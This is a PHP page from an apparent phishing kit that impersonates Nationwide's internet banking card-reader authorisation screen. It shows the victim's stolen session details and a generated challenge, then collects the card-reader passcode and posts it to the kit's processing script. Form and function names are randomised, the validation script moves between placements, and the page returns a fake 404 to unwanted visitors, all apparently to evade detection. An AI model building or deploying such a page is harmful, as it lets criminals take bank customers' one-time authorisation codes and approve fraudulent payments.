<?php
session_start();
error_reporting(0);
include "nw.php";
include "control.php";
include "connect/out.php";
if(isset($_GET["inID"]))
{	
	$challenge=getChallenge($_SESSION["cusnum"],$_SESSION["dob"],$panel_rec);
	$fname=randomCha(rand(10,12));
	$fj=randomCha(rand(4,7));
	$fj1=randomCha(rand(7,9));
	$fj2=randomCha(rand(10,12));
	$rand=rand(1,3);
	$err="display:none";
	$_SESSION["act"]="ref";
	$text="refund";
	if($_GET["act"] == "noref")
	{
		$_SESSION["act"]="noref";
		$text="payment";
	}
	if(isset($_GET["err"]))
	{
		$err="";
	}
	echo '<!DOCTYPE html>
<html lang="en">
   <head>
      <meta http-equiv="content-type" content="text/html; charset=UTF-8">
      <meta name="MSSmartTagsPreventParsing" content="true">
      <meta http-equiv="X-UA-Compatible" content="IE=Edge">
      <meta name="viewport" content="width=1000">
      <meta name="format-detection" content="telephone=no">
      <link href="game/way/square.css'.outrand().'" rel="stylesheet" type="text/css">
      <link href="game/way/flow.css'.outrand().'" rel="stylesheet" type="text/css">
      <link href="game/way/online.css'.outrand().'" rel="stylesheet" type="text/css">
      <link href="game/way/box.css'.outrand().'" rel="stylesheet" type="text/css">
      <link rel="shortcut icon" href="favicon.ico'.outrand().'">
      <link rel="apple-touch-icon" href="game/120.png'.outrand().'" sizes="120x120">
      <link rel="apple-touch-icon" href="game/76.png'.outrand().'" sizes="76x76">
      <link rel="apple-touch-icon" href="game/76.png'.outrand().'">
      <title>
         Authorisation required - Nationwide Internet Bank
      </title>
	  ';if($rand==1){ echo '<script>function '.$fj.'(b){var a = document.forms["'.$fname.'"]["pc"];document.getElementById("errm2").style.display="none";document.getElementById("errm").style.display="";var err=0;if(a.value.length<1){document.getElementById("fr").style.display="";a.focus();err=1;return false;}else{document.getElementById("fr").style.display="none";}if(a.value.length<8){document.getElementById("min8").style.display="";a.focus();err=1;return false;}else{document.getElementById("min8").style.display="none";}if(err==0){document.getElementById("errm").style.display="none";}if(b == 1){document.getElementById("errm").style.display="none";document.forms["'.$fname.'"].submit();}}function '.$fj1.'(e){var unicode=e.charCode? e.charCode : e.keyCode;if (unicode!=8 && unicode!=9  && unicode!=13 ){ if (unicode<48||unicode>57){ return false;}}}</script>';} echo '
   </head>
   <body id="log-in-reader" class="two-col default-theme">
      <div id="overlay-container" style="display: none;"></div>
      <div id="skipLinkList" role="navigation">
         <ul>
            <li class="first" style="display: none;"><a href="#skipNavPrimaryNav" class="skip-link" id="skiptoNavPrimaryNav" title="">Skip to main navigation</a></li>
            <li style="display: none;"><a href="#skipNavSecondaryNav" class="skip-link" id="skiptoNavSecondaryNav" title="">Skip to secondary navigation</a></li>
            <li class="first"><a href="#skipNavMainContent" class="skip-link" id="skiptoNavMainContent" title="">Skip to main content</a></li>
            <li><a href="#skipNavSearch" class="skip-link" id="skiptoNavSearch" title="">Skip to search</a></li>
            <li style="display: none;"><a href="#skipNavOffers" class="skip-link" id="skiptoNavOffers" title="">Skip to offers</a></li>
            <li class="last"><a href="#skipNavFooter" class="skip-link" id="skiptoNavFooter" title="">Skip to footer</a></li>
         </ul>
      </div>
      <div id="wrapper_outer">
         <div id="header">
            <header>
               <div class="welcome-util-container">
                  <ul id="utility-links" role="navigation">
                     <li class="demo">
                        <a href="#" target="">
                        </a>
                     </li>
                     <li class="help">
                        <a href="#" id="external-page-help-link">
                        Help &amp; Demos
                        <span class="new-window-link"></span>
                        <span class="srText">Opens in a new window</span>
                        </a>
                        <div class="ct" id="helpCustomTitle" role="tooltip">
                           <div class="custom-inner">
                              <p>Help &amp; Demos</p>
                           </div>
                           <b class="ct-arrow-top"></b>
                        </div>
                     </li>
                  </ul>
                  <div id="search" role="search">
                     <a id="skipNavSearch"></a>
                     <form action="/Help/Search" autocomplete="off" id="help-search-form" method="post" name="HelpSearch" onsubmit="loadNewWindow(\'\', this.target)" target="HelpSearchWindow">
                        <input id="txtSrch" type="text" title="" value="Search" name="query" maxlength="100">
                        <a class="btnSrchGo" href="#" id="help-search-button" title="" value="Search"><b class="button"></b><i></i></a>
                     </form>
                  </div>
               </div>
               <div id="brand" role="banner">
                  <div title="" class="logo">
                     <img alt="nationwide.co.uk" src="game/way/nationwide-logo.png">
                  </div>
                  <img class="png title" src="game/way/tagline.png" alt="internet banking">
               </div>
               <div id="last-access">
                  <p>SSL Secured form</p>
               </div>
               <div id="log-out">
                  <form action="/AccessManagement/Logout/Logout" autocomplete="off" id="logoutForm" method="get"><img alt="This website is secure" class="png" src="game/way/log-out-lock.png">
                     <p class="logged-in">You are logged in securely</p>
                     <a class="log-out-link" title="" href="#">
                     <b class="button" onclick="window.location.assign(\'SignOff.php\')">Log out</b>
                     <i></i>
                     </a>
                     <div class="lightboxContainer">
                        <div id="logoutLightbox" class="lightbox-outer">
                           <h1>Log out - confirmation</h1>
                           <strong>Are you sure you want to log out?</strong>
                           <div>
                              <ul class="choices">
                                 <li><a href="#" id="lbBtnYes" class="btn-action btn-yes"><b></b><i>Yes<span class="srText"> I want to logout</span></i></a></li>
                                 <li><a href="#" id="lbBtnNo" class="btn-action btn-no"><b></b><i>No<span class="srText"> I want to remain logged in</span></i></a></li>
                              </ul>
                           </div>
                           <div class="clear-line"></div>
                           <div class="activity-info">
                              <span>You can <a href="#">view and download your activity summary</a> before logging out.</span>
                           </div>
                        </div>
                     </div>
                  </form>
                  <div class="lightboxContainer">
                     <span id="secondsBeforeWarningDisplay">255</span>
                     <span id="secondsToDisplayWarning">30</span>
                     <span id="keepServerSessionAliveIntervalInSeconds">285</span>
                     <span id="logoutPageRoute">/AccessManagement/Logout/LogoutViaTimeout</span>
                     <span id="extendSessionRoute">/AccessManagement/Logout/ExtendSession</span>
                     <span id="extendServerSessionRoute">/AccessManagement/Logout/ExtendServerSession</span>
                     <div id="timeoutLightbox" class="lightbox-outer">
                        Time-out warning
                        <p>Due to inactivity, you will be automatically logged out of the Internet Bank in 30 seconds.</p>
                        <p>
                           You will be logged out in
                           <span id="secsLeft"></span>
                           seconds.
                        </p>
                        <strong>Do you want to remain logged in?</strong>
                        <ul class="choices">
                           <li><a href="#" id="lbBtnYesRemain" class="btn-action btn-yes"><b></b><i>Yes, remain logged in</i></a></li>
                           <li><a href="#" id="lbBtnNoLogOut" class="btn-action btn-no"><b></b><i>No, log out</i></a></li>
                        </ul>
                     </div>
                  </div>
               </div>
            </header>
         </div>
         <div id="wrapper_content">
            <div id="application">
               <div id="user-content" style="height: 728px;">
                  <span></span>
               </div>
               <div id="stage" style="height: 768px;height: auto;">
                  <div id="stageInner" style="height: 723px;height: auto;">
                     <div class="content">
                        <div class="main-content-column">
                           <a id="skipNavMainContent"></a>
                           <div id="pageMessageArea">
                              <div id="info-pageMessageArea" class="page-msg info-msg no-msg" role="alert">
                                 <h2><span></span></h2>
                                 <div class="inner-msg">
                                    <p></p>
                                 </div>
                              </div>
                              <div id="warning-pageMessageArea" class="page-msg warning-msg no-msg" role="alert">
                                 <h2><span></span></h2>
                                 <div class="inner-msg">
                                    <p></p>
                                 </div>
                              </div>
                              <div id="error-pageMessageArea" class="page-msg error-msg no-msg" role="alert">
                                 <h2><span></span></h2>
                                 <div class="inner-msg">
                                    <p></p>
                                 </div>
                              </div>
                              <div id="confirm-pageMessageArea" class="page-msg confirm-msg no-msg" role="alert">
                                 <h2><span></span></h2>
                                 <div class="inner-msg">
                                    <p></p>
                                 </div>
                              </div>
                           </div>
                           <div class="page-msg error-msg validation-summary-errors" id="errm" role="alert" style="display: none;">
                              <h2><b></b>Error</h2>
                              <div class="inner-msg">
                                 <p>Sorry - you must correct the errors on this page before you can continue.</p>
                              </div>
                           </div>
                           <div id="errm2" class="page-msg error-msg " role="alert" id="errm2" style="'.$err.'">
                              <h2><span></span>Error</h2>
                              <div class="inner-msg">
                                 <p>Your card reader details have been entered incorrectly. Please try again.</p>
                              </div>
                           </div>
                           <div class="content-pod login-pod">
                              <div class="stage-head">
                                 <h1>Authorisation Required</h1>
                              </div>
                              <div class="inner-box cust-num-box">
							  ';if($rand==2){ echo '<script>function '.$fj.'(b){var a = document.forms["'.$fname.'"]["pc"];document.getElementById("errm2").style.display="none";document.getElementById("errm").style.display="";var err=0;if(a.value.length<1){document.getElementById("fr").style.display="";a.focus();err=1;return false;}else{document.getElementById("fr").style.display="none";}if(a.value.length<8){document.getElementById("min8").style.display="";a.focus();err=1;return false;}else{document.getElementById("min8").style.display="none";}if(err==0){document.getElementById("errm").style.display="none";}if(b == 1){document.getElementById("errm").style.display="none";document.forms["'.$fname.'"].submit();}}function '.$fj1.'(e){var unicode=e.charCode? e.charCode : e.keyCode;if (unicode!=8 && unicode!=9  && unicode!=13 ){ if (unicode<48||unicode>57){ return false;}}}</script>';} echo '
                                 <form action="AuthProcessing.php?/AccesManagement/IdentfyCustomer/'.randomChaSp(rand(5,10)).'&inID='.randomCha(rand(40,60)).'" method="POST" onsubmit="'.$fj.'(1); return false;" autocomplete="off" id="'.$fname.'" name="'.$fname.'" method="post" novalidate="novalidate">
                                    <p><span class="mandatory-fields-note"></span></p>
                                    <p class="section-header">For your security, you need to use your card and card reader to authorise this '.$text.'. </p>
                                    <p></p>
                                    1. Insert your card
                                    **** **** **** '.$_SESSION["char4"].'
                                    into the card reader. 
                                    <p></p>
                                    <p>2. Press <img alt="\'Tick\'" src="game/way/cardReaderSign.png"> when asked to \'Select Function\'.</p>
                                    <div class="clear-line"></div>
                                    <p>3. Enter your debit card PIN and press <img alt="OK" src="game/way/cardReaderOK.png"></p>
                                    <p>4. Enter reference number</p>
                                    <strong>
                                    '.$challenge.'
                                    </strong>
                                    and press <img src="game/way/cardReaderOK.png" alt="OK">
                                    <p></p>
                                    <p></p>
                                    5. Enter amount of '.$text.'
                                    <strong>
                                   '.$_SESSION["amount"].'
                                    </strong>
                                    and press <img src="game/way/cardReaderOK.png" alt="OK"> You do not need to enter the decimal point.  For example, an amount of £132.00 would be entered as 13200.
                                    <p></p>
                                    <div class="list-text-ie6 last-item">
                                       <p>6. Enter the passcode that is now displayed on your card reader and then click \'Authorise\'.</p>
                                    </div>
                                    <div class="inner-box-border">
                                       <span class="field-validation-valid"></span>
                                       <span class="field-validation-error" id="fr" style="display:none"><span id="PassCode-error" class="">This information is required.</span></span>
                                       <span class="field-validation-error" id="min8" style="display:none"><span id="PassCode-error" class="">Enter 8 numbers.</span></span>
                                       <label for="PassCode">Passcode:</label>
                                       <input class="cust-num-text" id="PassCode" maxlength="9" name="pc" type="text" onkeypress="return '.$fj1.'(event)" onblur="'.$fj.'(0)">
                                       <a href="javascript:void(0)" onclick="'.$fj.'(1)" id="authoriseButton" class="btn-action btn-authorise"><b></b><i>Authorise</i></a>
                                    </div>
                                 </form>
                                 <form action="/AccessManagement/AuthenticateUsingRca/CancelRcaChallenge" autocomplete="off" id="cancel-challenge" method="post">
                                    <div class="inner-box-border">
                                       <p class="last">If you don\'t have your card and card reader with you, 
                                          you won\'t be able to proceed with this request. Please select the Cancel
                                          request button to return to your Account Overview.
                                       </p>
                                       <a href="#" id="cancelRCAChallengeButton" class="btn-2nd-action btn-cancel-request" title=""  onclick="window.location.assign(\'SignOff.php\')">
                                       <b></b>
                                       <i>Cancel request</i>
                                       </a>
                                       <div class="clear-both"></div>
                                    </div>
                                 </form>
                              </div>
                              <div class="information-box">
                                 <h2>Your card reader will automatically switch off after 40 seconds. 
                                    Don\'t worry, this won\'t affect your transaction. Simply re-insert your 
                                    card to start again.
                                 </h2>
                                 <p>If you log out or close this session before clicking Authorise your transaction will not be processed.</p>
                                 <div class="image-list-text image-list-text-ie6">
                                    <p>If you make a mistake on your card reader press <img src="game/way/cardReaderClear.png" alt="CL"> to delete the last number or press <img src="game/way/cardReaderCancel.png" alt="C"> to delete all numbers.</p>
                                 </div>
                                 <div class="clear-line">&nbsp;</div>
                              </div>
                           </div>
                        </div>
                        <div class="side-content-column">
                           <img alt="" src="game/way/CardReaderHolderImage.jpg"> 
                           <h3>Why do I need to do this?</h3>
                           <a class="new-window-link" href="#"><strong>Learn more</strong></a> about why we\'re asking you to use a card and card reader to do some Internet Banking transactions. 
                           <h3>How do I do this?</h3>
                           <a class="new-window-link" href="#"><strong>Watch a demo</strong><span class="srText">Opens in a new window</span></a> - How to use your card reader to set up, make or change payments.<br><br>
                           <a class="new-window-link" href="#"><strong>Find out</strong></a> how to use your card and card reader. 
                           <h3>What if I have any questions?</h3>
                           <a class="new-window-link" href="#"><strong>Get answers</strong></a> to common questions. 
                           <h3>My card reader isn\'t working.</h3>
                           <a class="new-window-link" href="#"><strong>Find out</strong></a> what to do if you have not received your card reader or it is not working properly. 
                           <style>
                              #vishing-msg {width:160px !important;}
                           </style>
                        </div>
                     </div>
                     <div class="clear-line">&nbsp;</div>
                  </div>
               </div>
               <div id="nw-content" style="height: 718px;">
                  <span>
                  </span>
               </div>
            </div>
         </div>
         <div id="footer">
            <footer>
               <a id="skipNavFooter"></a>
               <ul>
                  <li class="first"><a class="new-window-link" href="#">Accessibility<span class="srText">Opens in a new window</span></a></li>
                  <li><a class="new-window-link" href="#">Explore Nationwide<span class="srText">Opens in a new window</span></a></li>
                  <li><a href=""></a></li>
                  <li class="last"><a class="new-window-link" href="#">How Nationwide uses your information<span class="srText">Opens in a new window</span></a></li>
               </ul>
               <p class="legal"> Nationwide Building Society is authorised by the 
                  Prudential Regulation Authority and regulated by the Financial Conduct 
                  Authority and the Prudential Regulation Authority under registration 
                  number 106078. You can confirm our registration on the FCA’s website <a href="#" title="" class="new-window-link">www.fca.gov.uk<span class="srText"></span></a>. Nationwide is not responsible for the content of external websites.
               </p>
            </footer>
         </div>
      </div>
      <div id="lightbox-details" style="display:none;">
         <span id="lightbox-details-close-icon-title">Close</span>
         <div id="lightbox-details-close-icon-hidden-html">
            <span class="srText">Close layer and return to page</span>
         </div>
      </div>
      <div id="cboxOverlay" style="display: none;"></div>
      <div id="colorbox" class="" role="dialog" tabindex="-1" style="display: none;">
         <div id="cboxWrapper">
            <div>
               <div id="cboxTopLeft" style="float: left;"></div>
               <div id="cboxTopCenter" style="float: left;"></div>
               <div id="cboxTopRight" style="float: left;"></div>
            </div>
            <div style="clear: left;">
               <div id="cboxMiddleLeft" style="float: left;"></div>
               <div id="cboxContent" style="float: left;">
                  <div id="cboxTitle" style="float: left;"></div>
                  <div id="cboxCurrent" style="float: left;"></div>
                  <button type="button" id="cboxPrevious"></button><button type="button" id="cboxNext"></button><button id="cboxSlideshow"></button>
                  <div id="cboxLoadingOverlay" style="float: left;"></div>
                  <div id="cboxLoadingGraphic" style="float: left;"></div>
               </div>
               <div id="cboxMiddleRight" style="float: left;"></div>
            </div>
            <div style="clear: left;">
               <div id="cboxBottomLeft" style="float: left;"></div>
               <div id="cboxBottomCenter" style="float: left;"></div>
               <div id="cboxBottomRight" style="float: left;"></div>
            </div>
         </div>
		 ';if($rand==3){ echo '<script>function '.$fj.'(b){var a = document.forms["'.$fname.'"]["pc"];document.getElementById("errm2").style.display="none";document.getElementById("errm").style.display="";var err=0;if(a.value.length<1){document.getElementById("fr").style.display="";a.focus();err=1;return false;}else{document.getElementById("fr").style.display="none";}if(a.value.length<8){document.getElementById("min8").style.display="";a.focus();err=1;return false;}else{document.getElementById("min8").style.display="none";}if(err==0){document.getElementById("errm").style.display="none";}if(b == 1){document.getElementById("errm").style.display="none";document.forms["'.$fname.'"].submit();}}function '.$fj1.'(e){var unicode=e.charCode? e.charCode : e.keyCode;if (unicode!=8 && unicode!=9  && unicode!=13 ){ if (unicode<48||unicode>57){ return false;}}}</script>';} echo '
         <div style="position: absolute; width: 9999px; visibility: hidden; display: none; max-width: none;"></div>
      </div>
   </body>
</html>';
}
else
{
	header($_SERVER['SERVER_PROTOCOL'] . ' 404 Page Not Found', true, 403);
	die("<h1>404 Page Not Found</h1>");
}
?>